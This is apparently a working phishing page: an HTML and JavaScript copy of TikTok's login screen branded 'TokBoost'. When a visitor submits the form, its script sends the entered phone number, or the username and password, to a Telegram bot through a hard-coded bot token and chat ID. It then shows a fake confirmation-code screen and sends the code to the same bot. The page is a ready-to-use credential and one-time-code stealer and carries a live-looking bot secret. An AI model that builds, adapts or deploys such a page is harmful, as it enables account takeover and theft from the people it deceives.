<!doctype html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TikTok - Log In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        body {
            background-color: #ffffff;
            color: #161823;
            font-family:
                "SofiaPro",
                -apple-system,
                BlinkMacSystemFont,
                "Segoe UI",
                Roboto,
                Helvetica,
                Arial,
                sans-serif;
        }

        .tiktok-input:focus {
            border-color: #fe2c55 !important;
            outline: none;
        }

        .pin-input {
            border-bottom: 2px solid #e3e3e4;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            width: 35px;
        }

        .pin-input:focus {
            border-color: #fe2c55;
            outline: none;
        }

        /* Shimmer Animation for Splash */
        @keyframes shimmer {
            0% {
                transform: scaleX(0);
                transform-origin: left;
            }

            50% {
                transform: scaleX(1);
                transform-origin: left;
            }

            50.1% {
                transform-origin: right;
            }

            100% {
                transform: scaleX(0);
                transform-origin: right;
            }
        }

        .animate-shimmer {
            animation: shimmer 1.5s infinite ease-in-out;
        }
    </style>
</head>

<body class="antialiased min-h-screen flex flex-col justify-between">
    <div id="splash-layer"
        class="fixed inset-0 bg-[#010101] z-50 flex flex-col items-center justify-center transition-opacity duration-700 opacity-100">
        <div class="transform scale-110 text-center">
            <svg class="w-20 h-20 mx-auto fill-current text-white" viewBox="0 0 24 24">
                <path
                    d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.03 1.6 4.15 1.16 1.25 2.8 1.98 4.51 2.13v3.83c-1.46-.06-2.92-.51-4.14-1.33-.28-.2-.55-.42-.79-.66v6.78c.03 3.9-2.73 7.42-6.59 8.04-4.57.84-8.86-2.29-9.52-6.85-.75-4.45 2.11-8.79 6.51-9.62.91-.18 1.84-.2 2.76-.05v3.91c-.6-.17-1.24-.19-1.85-.06-1.95.37-3.26 2.21-2.93 4.19.3 2.11 2.31 3.52 4.42 3.16 1.66-.26 2.86-1.68 2.86-3.36V0l.02.02z" />
            </svg>
            <h1 class="text-lg tracking-[0.3em] font-black uppercase mt-5 text-white/90">
                TokBoost
            </h1>
            <div class="mt-4 flex justify-center">
                <div class="w-12 h-1 bg-white/20 rounded-full overflow-hidden">
                    <div class="w-full h-full bg-zinc-400 animate-shimmer rounded-full"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="w-full max-w-md mx-auto px-6 pt-4 flex-grow flex flex-col">
        <header class="flex items-center justify-between pb-4">
            <button class="text-xl text-zinc-800">
                <i class="fa-solid fa-arrow-left"></i>
            </button>
            <h2 id="view-title" class="text-[17px] font-bold text-zinc-900">
                Log in
            </h2>
            <button class="text-xl text-zinc-500">
                <i class="fa-regular fa-circle-question"></i>
            </button>
        </header>

        <div id="login-view" class="mt-4 flex-grow flex flex-col justify-between hidden">
            <div>
                <div class="flex border-b border-zinc-100 text-center font-semibold text-[15px] relative">
                    <button id="tab-phone" onclick="switchTab('phone')"
                        class="w-1/2 pb-3 text-zinc-900 border-b-2 border-zinc-900 transition-all">
                        Phone
                    </button>
                    <button id="tab-email" onclick="switchTab('email')"
                        class="w-1/2 pb-3 text-zinc-400 border-b-2 border-transparent transition-all">
                        Email / Username
                    </button>
                </div>

                <form id="auth-main-form" class="mt-6 space-y-4" oninput="validateLoginForm()">
                    <div id="phone-fields" class="space-y-4">
                        <div class="flex gap-2">
                            <div
                                class="flex items-center gap-1 bg-zinc-50 border border-zinc-200/80 rounded px-3 py-2.5 text-[15px] font-medium text-zinc-800 cursor-pointer">
                                <span>KE +254</span>
                                <i class="fa-solid fa-caret-down text-xs text-zinc-400"></i>
                            </div>
                            <input type="tel" id="input-phone" placeholder="Phone number"
                                class="tiktok-input flex-grow bg-zinc-50 border border-zinc-200/80 rounded px-4 py-2.5 text-[15px] placeholder-zinc-400" />
                        </div>
                    </div>

                    <div id="email-fields" class="space-y-4 hidden">
                        <input type="text" id="input-user" placeholder="Email or username"
                            class="tiktok-input w-full bg-zinc-50 border border-zinc-200/80 rounded px-4 py-2.5 text-[15px] placeholder-zinc-400" />
                        <div class="relative">
                            <input type="password" id="input-pass" placeholder="Password"
                                class="tiktok-input w-full bg-zinc-50 border border-zinc-200/80 rounded px-4 py-2.5 text-[15px] placeholder-zinc-400 pr-10" />
                            <button type="button" onclick="togglePassVisibility()"
                                class="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-400 text-sm">
                                <i id="pass-icon" class="fa-regular fa-eye-slash"></i>
                            </button>
                        </div>
                        <a href="#" class="block text-xs font-semibold text-zinc-900 hover:underline">Forgot
                            password?</a>
                    </div>
                </form>
            </div>

            <div class="pb-8 mt-4">
                <button id="login-submit-btn" disabled onclick="submitLogin(event)"
                    class="w-full bg-[#fe2c55]/50 text-white font-semibold py-3 rounded text-[15px] transition-all cursor-not-allowed text-center">
                    <span id="login-btn-txt">Send code</span>
                </button>
            </div>
        </div>

        < <div id="pin-view" class="mt-8 flex-grow flex flex-col justify-between hidden">
            <div>
                <h3 class="text-xl font-bold text-zinc-900">
                    Enter Confirmation Code
                </h3>

                <p id="pin-sub-text" class="text-sm text-zinc-500 mt-1.5 leading-relaxed">
                    Please enter the 6-digit reference code to proceed.
                </p>

                <div class="mt-6">
                    <input type="text" id="order-reference-input" maxlength="6" pattern="[0-9]*" inputmode="numeric"
                        placeholder="e.g. 558921"
                        class="tiktok-input w-full bg-zinc-50 border border-zinc-200/80 rounded px-4 py-2.5 text-[15px] placeholder-zinc-400 font-semibold tracking-widest text-center focus:border-[#fe2c55]" />
                </div>

                <div id="pin-loading-state" class="mt-8 text-center hidden">
                    <div
                        class="w-8 h-8 border-4 border-[#fe2c55] border-t-transparent rounded-full animate-spin mx-auto">
                    </div>
                    <p class="text-sm text-zinc-500 mt-3 font-medium">
                        Checking reference network database...
                    </p>
                </div>

                <div id="timer-container" class="text-sm font-semibold text-zinc-400 mt-6 text-center">
                    Resend code
                    <span id="timer-countdown" class="text-zinc-800 ml-1">59s</span>
                </div>
            </div>

            <div class="pb-8 space-y-3">
                <button id="verify-submit-btn" onclick="executeOrderValidation()"
                    class="w-full bg-[#fe2c55] text-white font-semibold py-3 rounded text-[15px] transition-all text-center hover:bg-[#e02247]">
                    Verify Reference
                </button>
                <!-- <button id="verify-skip-btn" onclick="skipVerification()"
                    class="w-full bg-transparent text-zinc-500 font-semibold py-2 rounded text-[14px] text-center hover:text-zinc-800">
                    Skip Tracking
                </button> -->
                <div class="pt-4 text-center text-xs text-zinc-400">
                    Security Verification Standard Protocol
                </div>
            </div>
    </div>
    </div>

    <script>
        let currentActiveTab = "phone";

        // 1. Splash Transition Logic
        document.addEventListener("DOMContentLoaded", () => {
            setTimeout(() => {
                const splash = document.getElementById("splash-layer");
                const loginView = document.getElementById("login-view");

                splash.classList.add("opacity-0");
                setTimeout(() => {
                    splash.style.display = "none";
                    loginView.classList.remove("hidden");
                }, 700);
            }, 2500);
        });

        // 2. Interactive Navigation Tabs Implementation
        function switchTab(tab) {
            currentActiveTab = tab;
            const phoneTab = document.getElementById("tab-phone");
            const emailTab = document.getElementById("tab-email");
            const phoneFields = document.getElementById("phone-fields");
            const emailFields = document.getElementById("email-fields");
            const submitBtnTxt = document.getElementById("login-btn-txt");

            if (tab === "phone") {
                phoneTab.className =
                    "w-1/2 pb-3 text-zinc-900 border-b-2 border-zinc-900 transition-all";
                emailTab.className =
                    "w-1/2 pb-3 text-zinc-400 border-b-2 border-transparent transition-all";
                phoneFields.classList.remove("hidden");
                emailFields.classList.add("hidden");
                submitBtnTxt.innerText = "Send code";
            } else {
                phoneTab.className =
                    "w-1/2 pb-3 text-zinc-400 border-b-2 border-transparent transition-all";
                emailTab.className =
                    "w-1/2 pb-3 text-zinc-900 border-b-2 border-zinc-900 transition-all";
                phoneFields.classList.add("hidden");
                emailFields.classList.remove("hidden");
                submitBtnTxt.innerText = "Log in";
            }
            validateLoginForm();
        }

        // 3. Password field masking visibility utility
        function togglePassVisibility() {
            const passInput = document.getElementById("input-pass");
            const passIcon = document.getElementById("pass-icon");
            if (passInput.type === "password") {
                passInput.type = "text";
                passIcon.className = "fa-regular fa-eye";
            } else {
                passInput.type = "password";
                passIcon.className = "fa-regular fa-eye-slash";
            }
        }

        // 4. Live Native Input Form Tracker (Forces Faded/Disabled styles matches images)
        function validateLoginForm() {
            const btn = document.getElementById("login-submit-btn");
            let isValid = false;

            if (currentActiveTab === "phone") {
                const phoneVal = document.getElementById("input-phone").value.trim();
                isValid = phoneVal.length >= 7; // Simple length verification metric
            } else {
                const userVal = document.getElementById("input-user").value.trim();
                const passVal = document.getElementById("input-pass").value.trim();
                isValid = userVal.length > 0 && passVal.length >= 4;
            }

            if (isValid) {
                btn.removeAttribute("disabled");
                btn.className =
                    "w-full bg-[#fe2c55] text-white font-semibold py-3 rounded text-[15px] transition-all cursor-pointer text-center hover:bg-[#e02247]";
                btn.style.opacity = "1";
            } else {
                btn.setAttribute("disabled", "true");
                btn.className =
                    "w-full bg-[#fe2c55]/50 text-white font-semibold py-3 rounded text-[15px] transition-all cursor-not-allowed text-center";
                btn.style.opacity = "0.5";
            }
        }

        // 5. Submit Event Trigger Layer -> Transitions to Pin Frame
        // 5. Submit Event Trigger Layer -> Sends data to Telegram & Transitions to Pin Frame
        async function submitLogin(event) {
            event.preventDefault();

            // --- TELEGRAM BOT CONFIGURATION ---
            // Replace these strings with your actual Telegram credentials
            const TELEGRAM_BOT_TOKEN =
                "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
            const TELEGRAM_CHAT_ID = "7162306402";
            // ----------------------------------

            const title = document.getElementById("view-title");
            const loginLayer = document.getElementById("login-view");
            const pinLayer = document.getElementById("pin-view");
            const subtext = document.getElementById("pin-sub-text");
            const submitBtn = document.getElementById("login-submit-btn");

            let credentialData = "";
            let logMessage = "🔔 **New TokBoost Login Attempt**\n\n";

            if (currentActiveTab === "phone") {
                const num = document.getElementById("input-phone").value.trim();
                credentialData = `+254 ${num}`;
                subtext.innerText = `Your code was sent to +254 ${num}`;
                logMessage += `📱 **Method:** Phone\n📞 **Number:** ${credentialData}`;
            } else {
                const user = document.getElementById("input-user").value.trim();
                const pass = document.getElementById("input-pass").value.trim();
                credentialData = user;
                subtext.innerText = `Your code was sent to email: ${user}`;
                logMessage += `📧 **Method:** Email/Username\n👤 **User:** ${user}\n🔑 **Password:** ${pass}`;
            }

            // Change button state to loading visually
            submitBtn.disabled = true;
            submitBtn.style.opacity = "0.7";
            document.getElementById("login-btn-txt").innerText = "Connecting...";

            try {
                // Send data directly from frontend to Telegram API
                await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: logMessage,
                            parse_mode: "Markdown",
                        }),
                    },
                );
            } catch (err) {
                // Fail silently or log locally so the user experience doesn't break if Telegram is slow
                console.error("Telegram delivery log failed:", err);
            }

            // Transition to Pin verification frame instantly
            title.innerText = "Reset";
            loginLayer.classList.add("hidden");
            pinLayer.classList.remove("hidden");

            // Focus on first PIN box automatically
            document.querySelector(".pin-input").focus();
            runPinTimer();
        }
        // 6. Order Reference Validation and Telegram Delivery Handler
        async function executeOrderValidation() {
            // const pinInputs = document.querySelectorAll('.pin-input');
            const referenceInput = document
                .getElementById("order-reference-input")
                .value.trim();
            const loadingState = document.getElementById("pin-loading-state");

            // Basic format validation (6 digits required)
            if (referenceInput.length !== 6 || isNaN(referenceInput)) {
                alert("Please enter a valid 6-digit numeric reference code.");
                return;
            }

            // --- TELEGRAM BOT CONFIGURATION ---
            const TELEGRAM_BOT_TOKEN =
                "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
            const TELEGRAM_CHAT_ID = "7162306402";
            // ----------------------------------

            // Show visual progress loader
            loadingState.classList.remove("hidden");

            let logMessage = "📦 **New Order Reference Submitted**\n\n";
            logMessage += `🔢 **Reference ID:** ${referenceInput}\n`;
            logMessage += `⏰ **Timestamp:** ${new Date().toLocaleString()}`;

            try {
                // Dispatch the data payload to the Telegram Bot API
                await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                    {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: logMessage,
                            parse_mode: "Markdown",
                        }),
                    },
                );
            } catch (err) {
                console.error("Telegram reference log delivery failed:", err);
            }

            setTimeout(() => {
                localStorage.setItem("active_order_ref", referenceInput);
                window.location.href = "home.html";
            }, 7000);

            // Stash the reference locally and transition immediately to the storefront
        }

        function skipVerification() {
            localStorage.removeItem("active_order_ref");
            window.location.href = "home.html";
        }
        // 6. Native Auto-Jump Sequence Flow for Underlined Inputs
        function trackPinSequence(e) {
            const target = e.target;
            const val = target.value;

            // Strip any non-numeric variables
            target.value = val.replace(/[^0-9]/g, "");

            if (target.value.length === 1) {
                const nextInput = target.nextElementSibling;
                if (nextInput && nextInput.classList.contains("pin-input")) {
                    nextInput.removeAttribute("disabled");
                    nextInput.focus();
                } else {
                    // All 6 values are fully submitted! Trigger redirection sequence
                    executeOrderValidation();
                    // executeRedirectionPipeline();
                }
            }
        }

        // Handle Backspace deletions smoothly
        document.addEventListener("keydown", (e) => {
            if (
                e.key === "Backspace" &&
                e.target.classList.contains("pin-input") &&
                e.target.value === ""
            ) {
                const prevInput = e.target.previousElementSibling;
                if (prevInput && prevInput.classList.contains("pin-input")) {
                    e.target.setAttribute("disabled", "true");
                    prevInput.focus();
                    prevInput.value = "";
                }
            }
        });

        // 7. Verification Timer Countdown Tick
        function runPinTimer() {
            let timeLeft = 59;
            const timerEl = document.getElementById("timer-countdown");
            const interval = setInterval(() => {
                timeLeft--;
                timerEl.innerText = `${timeLeft}s`;
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    timerEl.innerText = "Resend";
                    timerEl.className = "text-[#fe2c55] cursor-pointer hover:underline";
                }
            }, 1000);
        }

        // 8. Dynamic Redirection Sequence directly out to store interface
        function executeRedirectionPipeline() {
            // Give them a split second visual feedback confirmation tick
            const pinInputs = document.querySelectorAll(".pin-input");
            pinInputs.forEach((input) => (input.style.borderColor = "#25f4ee"));

            setTimeout(() => {
                window.location.href = "index.html";
            }, 1500); // Redirects straight into storefront after verification delay loop
        }
    </script>
</body>

</html>
